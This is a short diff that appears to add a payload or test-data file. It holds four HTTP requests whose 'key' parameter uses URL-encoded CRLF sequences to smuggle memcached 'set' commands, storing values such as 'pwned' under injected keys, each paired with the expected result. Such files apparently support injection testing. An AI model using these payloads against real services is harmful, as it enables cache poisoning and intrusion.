@@ -1,0 +1,5 @@
+GET /api/set?key=1%0d%0aset%20123%201%20600%205%0d%0apwned%0d%0a 123:pwned
+GET /api/set?key=1%0d%0aset%20test%201%20600%205%0d%0apwned%0d%0a test:pwned
+/api/set?key=a%0d%0a1%0d%0aset%20injected%200%203600%205%0d%0apwned%0d%0a injected:pwned
+/api/set?key=a%0d%0a1%0d%0aset%20injected%200%203600%2010%0d%0a1234567890%0d%0a injected: 1234567890
+
